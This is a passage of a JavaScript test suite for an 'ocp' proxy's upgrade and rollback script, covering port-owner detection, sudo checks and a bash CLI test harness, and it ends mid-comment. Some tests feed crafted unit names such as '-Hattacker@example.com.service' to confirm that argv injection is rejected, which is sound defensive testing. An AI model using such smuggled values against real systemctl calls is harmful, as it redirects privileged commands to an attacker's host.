    { status: 127, stdout: "", stderr: "/bin/sh: launchctl: command not found" }
  );
  const run = makeFakeRun({
    "lsof -nP": `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    55416 tester 23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    "launchctl print": launchctlMissingErr,
  });
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", run,
    });
  }, /could not determine what.*owns the OCP port.*launchctl print did not run/s);
});

test("#239 MED-6: injected runner — launchd reports a pid mismatch end to end (real listener, real print output, wrong pid inside it) refuses as no-unit", async () => {
  const run = makeFakeRun({
    "lsof -nP": `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    99999 tester 23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    "launchctl print": LAUNCHCTL_PRINT_RUNNING_OCP_12345, // pid = 12345 inside this fixture, not 99999
  });
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", run,
    });
  }, /PID 99999.*launchd job/s);
});

test("#239 MED-6: injected runner — a real listener whose launchd job argv does NOT invoke server.mjs refuses as foreign-process end to end, even for rollback", async () => {
  const hijackedBlob =
    "gui/501/dev.ocp.proxy = {\n\tstate = running\n\tprogram = /usr/bin/python3\n\t" +
    "arguments = {\n\t\t/usr/bin/python3\n\t\t/opt/some-other-daemon/main.py\n\t}\n\tpid = 12345\n}";
  const run = makeFakeRun({
    "lsof -nP": `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\npython3 12345 tester 23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    "launchctl print": hijackedBlob,
  });
  await assert.rejects(async () => {
    await runUpgrade({
      rollback: true, yes: true, mockExec: true,
      mockPlatform: "darwin", run,
      mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
      mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
    });
  }, /not OCP's server\.mjs.*main\.py/s);
});

test("#239 MED-6: injected runner — launchctl print is only invoked once a listener is actually confirmed (not shelled out to for nothing)", async () => {
  // Mirrors the Linux gather layer's own "don't shell out for nothing" posture (cgroup/cmdline
  // are only read once ss confirms a listener). Uses an explicit call COUNTER rather than only
  // asserting on the final error text — a "launchctl print" call whose result is discarded (the
  // gather layer's own catch swallows any thrown error into `null` silently) would otherwise
  // never surface in the final message at all, letting an accidental "always probe" regression
  // pass this test vacuously even though it shells out unnecessarily on every darwin restart
  // resolution, listening or not.
  let launchctlPrintCalls = 0;
  const run = makeFakeRun({
    "launchctl print": () => { launchctlPrintCalls++; return LAUNCHCTL_PRINT_RUNNING_OCP_12345; },
    "lsof -nP": "",
  });
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", run,
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "upgrade must refuse when nothing is listening");
  assert.ok(/nothing is currently listening/.test(caught.message), `expected the not-listening refusal; got: ${caught.message}`);
  assert.equal(launchctlPrintCalls, 0, "launchctl print must never be invoked when nothing is listening");
});

test("MED-6: injected runner — ss tool missing (throws) maps to 'unknown', aborts loudly, never silently proceeds", async () => {
  const run = makeFakeRun({
    "ss -lptn": new Error("command not found: ss"),
  });
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "linux", run,
    });
  }, /could not determine what.*owns the OCP port.*ss did not run/s);
});

test("MED-6: injected runner — cgroup read denied (raced PID / permission) maps to 'unknown', not a false 'no-unit'", async () => {
  const run = makeFakeRun({
    "ss -lptn": `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
    "cat /proc/798931/cgroup": new Error("cat: /proc/798931/cgroup: No such file or directory"),
  });
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "linux", run,
    });
  }, /could not determine what.*owns the OCP port.*could not read \/proc/s);
});

test("MED-6: injected runner — real mismatch end to end (ss+cgroup text in, sudo-authorized restart command out)", async () => {
  const run = makeFakeRun({
    "ss -lptn": `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
    "cat /proc/798931/cgroup": "0::/system.slice/ocp.service\n",
    // issue #237: see the "Linux path calls ss" test above for why this handler is required now.
    "cat /proc/798931/cmdline": "/usr/bin/node\0/opt/ocp/server.mjs\0",
    "sudo -n -l systemctl restart -- ocp.service": "systemctl restart -- ocp.service",
  });
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
    mockPlatform: "linux", mockIsRoot: false, run,
  });
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.deepEqual(restartCmds, ["sudo systemctl restart -- ocp.service"]);
});

test("#237: injected runner — REAL gather layer reads /proc/<pid>/cmdline and refuses a foreign process end to end (not just the pure functions)", async () => {
  // Every test above that exercises the #237 refusal uses mockOwnerProbe, which bypasses
  // scripts/upgrade.mjs's own gather layer (the `run(...)` calls) entirely. Per this repo's own
  // documented lesson (independent review of PR #221, finding MED-6 — see the "real mismatch end
  // to end" test just above): the IMPURE gather layer — which command runs, with which flags —
  // had ZERO coverage in the first cut of #215's fix, and that's exactly where the real defects
  // lived (a platform-branch swap survived undetected). This test drives the ACTUAL `cat
  // /proc/<pid>/cmdline` invocation scripts/upgrade.mjs's resolveRestartPlan() now makes, via a
  // fake command router — proving the wiring itself (not just resolveOwningUnit/planRestart in
  // isolation) refuses a foreign systemd unit.
  const run = makeFakeRun({
    "ss -lptn": `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("nginx",pid=445001,fd=6))`,
    "cat /proc/445001/cgroup": "0::/system.slice/nginx.service\n",
    "cat /proc/445001/cmdline": "nginx: master process /usr/sbin/nginx -g daemon off;\0",
  });
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "linux", mockIsRoot: true, run,
    });
  }, /nginx\.service.*not OCP's server\.mjs/s);
});

test("MED-4 wiring: injected runner — sudo -n -l denies THIS specific command → refuses (not a generic sudo -n true probe)", async () => {
  const run = makeFakeRun({
    "ss -lptn": `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
    "cat /proc/798931/cgroup": "0::/system.slice/ocp.service\n",
    // issue #237: see the "Linux path calls ss" test above for why this handler is required now.
    "cat /proc/798931/cmdline": "/usr/bin/node\0/opt/ocp/server.mjs\0",
    "sudo -n -l systemctl restart -- ocp.service": new Error("sudo: a password is required"),
  });
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "linux", mockIsRoot: false, run,
    });
  }, /not authorized non-interactively/);
});

test("MED-4 wiring: uid===0 short-circuits sudo entirely — no sudo probe run, plain systemctl", async () => {
  const run = makeFakeRun({
    "ss -lptn": `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
    "cat /proc/798931/cgroup": "0::/system.slice/ocp.service\n",
    // issue #237: see the "Linux path calls ss" test above for why this handler is required now.
    "cat /proc/798931/cmdline": "/usr/bin/node\0/opt/ocp/server.mjs\0",
    "sudo": new Error("test: sudo must not be invoked when already root"),
  });
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
    mockPlatform: "linux", mockIsRoot: true, run,
  });
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.deepEqual(restartCmds, ["systemctl restart -- ocp.service"]);
});

console.log("\nRestart-unit resolution (issue #215) — MED-8: rollback must not restart config it never restored:");

test("MED-8: rollback refuses to restart a SYSTEM unit — its config was never restored, and no daemon-reload was issued for it", async () => {
  await assert.rejects(async () => {
    await runUpgrade({
      rollback: true, yes: true, mockExec: true,
      mockPlatform: "linux",
      mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
      mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
        cgroupContent: "0::/system.slice/ocp.service\n",
      },
      mockIsRoot: true,
    });
  }, /rollback only restores the launchd plist and the USER-scope systemd unit file/);
});

test("MED-8: rollback DOES restart a matching USER unit, and issues daemon-reload first (Linux)", async () => {
  const result = await runUpgrade({
    rollback: true, yes: true, mockExec: true,
    mockPlatform: "linux",
    mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
    mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
    mockOwnerProbe: {
      ssOutput: `LISTEN 0 511 127.0.0.1:3456 0.0.0.0:* users:(("node",pid=888736,fd=19))`,
      cgroupContent: "0::/user.slice/user-1000.slice/user@1000.service/app.slice/ocp-proxy.service\n",
    },
  });
  const phaseNames = result.phases.map(p => p.name);
  const reloadIdx = phaseNames.indexOf("daemon-reload");
  const restartIdx = phaseNames.indexOf("restart");
  assert.ok(reloadIdx !== -1, "daemon-reload phase must run on Linux rollback");
  assert.ok(reloadIdx < restartIdx, "daemon-reload must happen BEFORE the restart, so the restored unit file is actually picked up");
});

console.log("\nRestart-unit resolution (issue #234) — rollback guard must key on UNIT IDENTITY, not scope:");

// Found by a second independent review of #221, post-merge. The SYSTEM-unit refusal above
// (MED-8) keys on `owner.kind === "system-unit"` — SCOPE, not IDENTITY. Rollback's restore step
// (scripts/lib/snapshot.mjs's tryCopy calls / runRollback's own tryCopy calls in
// scripts/upgrade.mjs) only ever writes `expectedUnit`'s own file — never any OTHER unit's,
// user-scope included. A user-scope unit under a DIFFERENT name is just as untouched by the
// restore as a system unit is, and slipped through this refusal unrefused before the #234 fix,
// letting rollback restart config it never touched while "ocp-proxy.service"'s freshly-restored
// file went unused — silently dropping the rollback's configuration half. See issue #234.

test("#234: rollback aborts when a DIFFERENT user-scope unit owns the port than the one whose config was restored", async () => {
  await assert.rejects(async () => {
    await runUpgrade({
      rollback: true, yes: true, mockExec: true,
      mockPlatform: "linux",
      mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
      mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 127.0.0.1:3456 0.0.0.0:* users:(("node",pid=888736,fd=19))`,
        cgroupContent: "0::/user.slice/user-1000.slice/user@1000.service/app.slice/custom-ocp.service\n",
      },
    });
  }, /rollback aborted: the OCP port is owned by a DIFFERENT user-scope unit \("custom-ocp\.service"\), but rollback only ever restores "ocp-proxy\.service"'s own config/);
});

test("#234: the mismatched-user-unit refusal never actually restarts the wrong unit (no restart COMMAND runs, only the bookkeeping failure phase)", async () => {
  let caught = null;
  try {
    await runUpgrade({
      rollback: true, yes: true, mockExec: true,
      mockPlatform: "linux",
      mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
      mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 127.0.0.1:3456 0.0.0.0:* users:(("node",pid=888736,fd=19))`,
        cgroupContent: "0::/user.slice/user-1000.slice/user@1000.service/app.slice/custom-ocp.service\n",
      },
    });
  } catch (e) {
    caught = e;
  }
  assert.ok(caught, "rollback must reject on a mismatched user-scope unit");
  assert.ok(!caught.phases.some(p => p.name === "restart" && p.cmd),
    `no restart COMMAND may run against a unit whose config was never restored; phases=${JSON.stringify(caught.phases)}`);
});

test("MED-8: rollback on macOS does NOT run daemon-reload (systemd-only concept)", async () => {
  const result = await runUpgrade({
    rollback: true, yes: true, mockExec: true,
    mockPlatform: "darwin",
    mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
    mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
  });
  assert.ok(!result.phases.some(p => p.name === "daemon-reload"));
});

test("rollback path: no-unit aborts the rollback with the same actionable message, carrying phases + target for diagnosis", async () => {
  await assert.rejects(async () => {
    await runUpgrade({
      rollback: true, yes: true, mockExec: true,
      mockPlatform: "linux",
      mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
      mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=55001,fd=19))`,
        cgroupContent: "0::/user.slice/user-1000.slice/user@1000.service/session.slice/session-3.scope\n",
      },
    });
  }, /not managed by any systemd unit/);
});

console.log("\nRestart-unit resolution (issue #215) — round-2 review: HIGH-A, MED-C, MED-D, MED-E, MED-F:");

// ── HIGH-A: rollback must not refuse forever on "not-listening" ──

test("HIGH-A: planRestart — rollback (allowNotListeningFallback) falls back to the default USER unit on Linux, with a loud warning", () => {
  const owner = { kind: "not-listening", platform: "linux", pid: null, unit: null, mismatched: false };
  const plan = planRestart(owner, { expectedUnit: "ocp-proxy.service", allowNotListeningFallback: true });
  assert.equal(plan.cmds.length, 1);
  assert.equal(plan.cmds[0].cmd, "systemctl --user restart -- ocp-proxy.service");
  assert.ok(plan.warnings.some(w => w.includes("nothing was listening")),
    "must warn loudly rather than silently falling back");
});

test("HIGH-A: planRestart — rollback (allowNotListeningFallback) falls back to the launchd bootout+bootstrap pair on macOS", () => {
  const owner = { kind: "not-listening", platform: "darwin", pid: null, unit: null, mismatched: false };
  const plan = planRestart(owner, { expectedUnit: "dev.ocp.proxy", plistPath: "/tmp/dev.ocp.proxy.plist", allowNotListeningFallback: true });
  assert.equal(plan.cmds.length, 2);
  assert.ok(plan.cmds[0].cmd.includes("launchctl bootout"));
  assert.ok(plan.cmds[1].cmd.includes("launchctl bootstrap") && plan.cmds[1].cmd.includes("/tmp/dev.ocp.proxy.plist"));
  assert.ok(plan.warnings.some(w => w.includes("nothing was listening")));
});

test("HIGH-A: planRestart — WITHOUT allowNotListeningFallback (the default; the upgrade path), not-listening still refuses (regression guard)", () => {
  const owner = { kind: "not-listening", platform: "linux", pid: null, unit: null, mismatched: false };
  assert.throws(() => planRestart(owner, { expectedUnit: "ocp-proxy.service" }), /nothing is currently listening/);
});

test("HIGH-A wiring: rollback with nothing listening on the port PROCEEDS instead of refusing forever (runUpgrade({rollback:true}) end to end)", async () => {
  // Before this fix: identical to the upgrade-path refusal, and re-running hit the exact same
  // "nothing is listening" state forever — the down service IS the reason to roll back.
  const result = await runUpgrade({
    rollback: true, yes: true, mockExec: true,
    mockPlatform: "linux",
    mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
    mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
    mockOwnerProbe: { ssOutput: "" }, // ran cleanly, confirmed nothing listening — the down-service rollback case
  });
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.deepEqual(restartCmds, ["systemctl --user restart -- ocp-proxy.service"]);
  assert.ok(result.phases.some(p => p.name === "restart-resolve" && p.note.includes("nothing was listening")),
    "the fallback must surface loudly in phases, not silently");
});

// ── MED-C: UNIT_NAME_RE must reject a leading "-" (argv injection, not just shell metacharacters) ──

test("MED-C: parseCgroupUnit rejects a leading-dash unit segment — never resolves it as a restart target", () => {
  // "-Hattacker@example.com.service" would otherwise become `systemctl restart -Hattacker@...`,
  // and systemctl's getopt-style parser reads a leading-dash argv word as an OPTION regardless
  // of its position — -H/--host connects over SSH to an attacker-chosen target.
  const cgroup = "0::/system.slice/-Hattacker@example.com.service\n";
  const result = parseCgroupUnit(cgroup);
  assert.notEqual(result.state, "resolved", "a leading-dash segment must never resolve to a restart target");
  assert.equal(result.unit, null);
});

test("MED-C: parseCgroupUnit rejects a leading-dash '-M' (machine) segment too, not just '-H' (host)", () => {
  const cgroup = "0::/system.slice/-Mevil.service\n";
  const result = parseCgroupUnit(cgroup);
  assert.notEqual(result.state, "resolved");
  assert.equal(result.unit, null);
});

test("MED-C: planRestart re-validates and rejects a leading-dash unit name at the shell-out boundary (defense in depth, mirrors MED-5)", () => {
  const userOwner = { kind: "user-unit", platform: "linux", pid: "1", unit: "-Hattacker@example.com.service", mismatched: false };
  assert.throws(() => planRestart(userOwner, { expectedUnit: "ocp-proxy.service" }), /failed validation/);

  const systemOwner = { kind: "system-unit", platform: "linux", pid: "1", unit: "-Mevil.service", mismatched: false };
  assert.throws(() => planRestart(systemOwner, { expectedUnit: "ocp-proxy.service", isRoot: true }), /failed validation/);
});

// ── MED-D: SO_REUSEPORT (multiple PIDs in ONE ss row) must be "unknown", same as dual-stack ──

test("MED-D: classifySsListener — SO_REUSEPORT (two PIDs inside ONE row's users:(()) group) → unknown, not the first PID picked arbitrarily", () => {
  // The bug: `line.match(/pid=(\d+)/)` is non-global, so only the FIRST "pid=" per line was
  // ever collected — this exact shape (one row, multiple processes sharing the port via
  // SO_REUSEPORT) silently resolved to {state:"listening", pid:"100"} pre-fix. Dual-stack
  // (separate rows, already covered above at "two distinct PIDs...") was never affected.
  const ss = `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=100,fd=19),("node",pid=101,fd=19))`;
  const result = classifySsListener(ss);
  assert.equal(result.state, "unknown");
  assert.ok(result.reason.includes("100") && result.reason.includes("101"),
    `reason should name both PIDs; got: ${result.reason}`);
});

// ── MED-E: rollback's daemon-reload must be best-effort, and only when it's about to restart ──
// ── the USER-scope unit rollback actually restores ──

test("MED-E: rollback's daemon-reload FAILURE is best-effort — the rollback still proceeds to restart, not aborted", async () => {
  const run = () => { throw new Error("Failed to connect to bus: No such file or directory (no XDG_RUNTIME_DIR)"); };
  const result = await runUpgrade({
    rollback: true, yes: true, mockExec: true, run,
    mockPlatform: "linux",
    mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
    mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
    mockOwnerProbe: {
      ssOutput: `LISTEN 0 511 127.0.0.1:3456 0.0.0.0:* users:(("node",pid=888736,fd=19))`,
      cgroupContent: "0::/user.slice/user-1000.slice/user@1000.service/app.slice/ocp-proxy.service\n",
    },
  });
  const reloadPhase = result.phases.find(p => p.name === "daemon-reload");
  assert.ok(reloadPhase, "daemon-reload must still be attempted");
  assert.equal(reloadPhase.status, "warn", "a failed daemon-reload must be logged as a WARNING, not abort the rollback");
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.deepEqual(restartCmds, ["systemctl --user restart -- ocp-proxy.service"],
    "rollback must still proceed to restart despite daemon-reload failing");
});

test("MED-E: rollback's daemon-reload is never attempted when the resolved owner is a SYSTEM unit (the refusal short-circuits first)", async () => {
  let caught = null;
  try {
    await runUpgrade({
      rollback: true, yes: true, mockExec: true,
      mockPlatform: "linux", mockIsRoot: true,
      mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
      mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
        cgroupContent: "0::/system.slice/ocp.service\n",
      },
    });
  } catch (e) {
    caught = e;
  }
  assert.ok(caught, "rollback must reject for a SYSTEM unit");
  assert.ok(!caught.phases.some(p => p.name === "daemon-reload"),
    "daemon-reload must not appear at all — the refusal happens before it would run");
});

// ── MED-F: the SYSTEM-unit rollback refusal must say the tree already moved + the exact command ──

test("MED-F: rollback's SYSTEM-unit refusal names the exact from-commit and the exact manual restart command (sudo-prefixed when not root)", async () => {
  let caught = null;
  try {
    await runUpgrade({
      rollback: true, yes: true, mockExec: true,
      mockPlatform: "linux", mockIsRoot: false, mockSudoAuthorized: true,
      mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
      mockSnapshotMeta: { fromCommit: "deadbee123", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
        cgroupContent: "0::/system.slice/ocp.service\n",
      },
    });
  } catch (e) {
    caught = e;
  }
  assert.ok(caught);
  assert.ok(caught.message.includes("deadbee123"),
    "must name the exact commit the working tree was already rolled back to");
  assert.ok(caught.message.includes("sudo systemctl restart -- ocp.service"),
    "must print the exact manual command to run, matching the upgrade-path refusals' own posture");
});

test("MED-F: rollback's SYSTEM-unit refusal recommends a bare (no-sudo) command when the caller is already root", async () => {
  let caught = null;
  try {
    await runUpgrade({
      rollback: true, yes: true, mockExec: true,
      mockPlatform: "linux", mockIsRoot: true,
      mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
      mockSnapshotMeta: { fromCommit: "deadbee123", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
        cgroupContent: "0::/system.slice/ocp.service\n",
      },
    });
  } catch (e) {
    caught = e;
  }
  assert.ok(caught);
  assert.ok(caught.message.includes("systemctl restart -- ocp.service"));
  assert.ok(!caught.message.includes("sudo systemctl restart -- ocp.service"),
    "already root must not be told to prefix the manual command with sudo");
});

// ═════════════════════════════════════════════════════════════════════════════
// ── ocp bash CLI wiring harness (issue #225) ──────────────────────────────────
// ═════════════════════════════════════════════════════════════════════════════
// `ocp` is a bash script; everything above tests JS. Before this section, `test-features.mjs`
// had no way to exercise `ocp`'s own dispatch/argument-forwarding wiring — the exact layer an
// independent review of PR #217 found to be 0/2 on mutation-catching (surviving mutations: the
// `--dry-run` guard _cmd_update_restart's review round added, and "$@" forwarding in a case
// arm), versus 9/9 on the JS layer (doctor.mjs, restart-unit.mjs, ocp-connect, service-mode).
// One of the two survivors was deleting the exact guard PR #217 spent three review rounds
// adding. This harness closes that gap and is the regression test for issues #235 and #236,
// found by the same review pass that produced #225.
//
// Harness shape (the "proven shape" #225 itself prescribes): slice ONLY the function
// definitions out of `ocp` — everything before the `# ── dispatch` section header — and run
// that slice in a real `bash` child process, with `cmd_restart` overridden as a shell function
// (defined AFTER the sliced source, in the same generated file — bash resolves whichever
// definition of a name appears LAST, so simple textual ordering gives the same "source, then
// override" semantics issue #225 prescribes without a separate `source` command) and every
// other externally-hazardous command replaced by a REAL EXECUTABLE FILE on a scratch $PATH.
//
// Why real files, not shell functions, for node/git/launchctl/systemctl/pkill/nohup/openclaw:
// `ocp`'s `upgrade|fresh_install)` kind arm does exactly `exec node "$script_dir/scripts/
// upgrade.mjs" "$@"` (also reached via `--rollback` and via `cmd_doctor`). Bash's `exec`
// replaces the process image via a normal PATH lookup for an executable — it does NOT consult
// the shell function table at all, so a `node() { ... }` shell-function override would be
// silently bypassed at exactly that line, and the REAL `scripts/upgrade.mjs` would run (which,
// under `--yes`, `execSync`s `mv ~/.ocp …` and `rm -rf <ocpDir>`). A previous attempt at this
// harness took a reviewing host's production OCP down this exact way, in miniature, by
// defining a `cmd_restart` shell-function stub BEFORE sourcing the real `ocp` (the real
// definition, sourced afterward, silently won). Putting a real fake-node FILE ahead of the
// real node on a from-scratch $PATH — never inheriting the calling shell's $PATH — makes the
// `exec` arm unreachable BY CONSTRUCTION: whether `node` is reached via a plain call, a
// pipeline, or `exec`, the executable that answers is this harness's own, and its default case
// for any invocation it doesn't explicitly recognize (`scripts/doctor.mjs --json` or
// `scripts/upgrade.mjs --post-flight-only`) refuses loudly (exit 97) rather than silently
// succeeding or falling through to a real script that doesn't exist in the scratch tree anyway.
// `launchctl`/`systemctl`/`pkill`/`nohup`/`openclaw` get the same scratch-$PATH treatment as
// defense in depth, even though the tests below only ever reach them (if at all) through the
// `cmd_restart` shell-function override, which never calls them for real.
//
// Anchor-drift guard (AGENTS.md "Testing discipline"): "dispatch" is a unique word among this
// file's own repeated "# ── <section> ──" header-comment convention (usage/status/health/.../
// restart/update/doctor/help each get one; only this one is named "dispatch"), so a plain
// `.indexOf` is safe from the multi-header collision the ocp-connect harness above guards
// against with paired start/end anchors. Still guarded: slice non-empty, slice contains the
// four function signatures every test below depends on, slice does NOT contain the dispatch
// case statement itself (overgrown-slice guard), and the REMOVED tail DOES contain it (confirms
// the boundary is where this comment claims, not merely "found A/B in either order").
//
// Scope, stated exactly (not merely implied by what's tested): this harness's `node` stub
// recognizes `scripts/doctor.mjs --json` (drives the kind decision) and `scripts/upgrade.mjs
// --post-flight-only` (drives _cmd_update_restart's verification step) by pattern-matching the
// invoking ARGV and returning a canned exit code — it never actually runs `scripts/upgrade.mjs`
// itself. This deliberately does NOT cover #225's own N6 finding: the real argv-parsing inside
// `scripts/upgrade.mjs`'s `_isMain()` CLI entrypoint (the `postFlightOnlyIdx = args.indexOf(...)`
// block, `scripts/upgrade.mjs` around line 598) that decides what "--post-flight-only" even
// means before `runPostFlightCheck`/`postFlightOk` (already covered directly, by name, elsewhere
// in this file — see the "upgrade full path" section's imports) get called. #225 explicitly
// flagged N6 as requiring a DECISION ("either invoke the real CLI end-to-end ... or refactor
// scripts/upgrade.mjs to accept an injectable ocpDir/homedir() override — whoever picks this up
// should decide which") rather than assuming either path is free. This PR's decision: defer,
// same as PR #217's own manual pass did for the same finding — invoking the real CLI end-to-end
// risks exactly the mutation hazard this harness's `node` stub exists to prevent, and building
// the injectable-override refactor is its own, separable unit of work. Tracked in #241.
console.log("\nocp bash CLI wiring (#225, #235, #236):");

const _bwOcpPath = spotJoin(_spotDir, "ocp");
const _bwFullSrc = _ltRead(_bwOcpPath, "utf8");
const _BW_DISPATCH_ANCHOR = "# ── dispatch";
const _bwDispatchIdx = _bwFullSrc.indexOf(_BW_DISPATCH_ANCHOR);
// Guard against a negative-index slice (`.slice(0, -1)` would silently return "everything but
// the last char" instead of throwing) BEFORE computing the slice, not after.
const _bwFnSrc = _bwDispatchIdx === -1 ? "" : _bwFullSrc.slice(0, _bwDispatchIdx);

test("ocp bash harness: '# ── dispatch' anchor slice is well-formed (premise, #225)", () => {
  assert.notEqual(_bwDispatchIdx, -1,
    "'# ── dispatch' anchor not found in ocp — reformatted? update the harness anchor");
  assert.ok(_bwFnSrc.trim().length > 0, "function-definitions slice is empty — anchor drift");
  for (const marker of ["cmd_update()", "_cmd_update_light()", "_cmd_update_restart()", "cmd_restart()"]) {
    assert.ok(_bwFnSrc.includes(marker), `function-definitions slice missing ${marker} — anchor drift`);
  }
  assert.ok(!_bwFnSrc.includes('case "$subcmd" in'),
    "function-definitions slice overgrown into the dispatch case statement — anchor drift");
  assert.ok(_bwFullSrc.slice(_bwDispatchIdx > -1 ? _bwDispatchIdx : 0).includes('case "$subcmd" in'),
    "the dispatch case statement was expected AFTER the anchor and is missing — anchor drift");
});

// Runs `cmd_update <args>` (or, with overrideCmdRestart:false, any other subcommand — see
// issue #224 tests below) against a from-scratch sandbox built fresh per call (own $HOME, own
// $PATH, own scratch `script_dir` — never the real repo, never the calling shell's $PATH/$HOME).
// `script_dir` doubles as the directory holding the generated driver script itself: `ocp`'s
// functions resolve `script_dir` from `${BASH_SOURCE[0]}`, which — for a directly-executed
// script (not `source`d) — is the file the running code was READ from, i.e. the driver file
// this harness writes. package.json therefore lives next to driver.sh, not in a subdirectory.
//
// Issue #224 additions (all default to the pre-#224 behavior so every existing call site above
// is unaffected):
//   overrideCmdRestart   default true (unchanged): cmd_restart is replaced by the
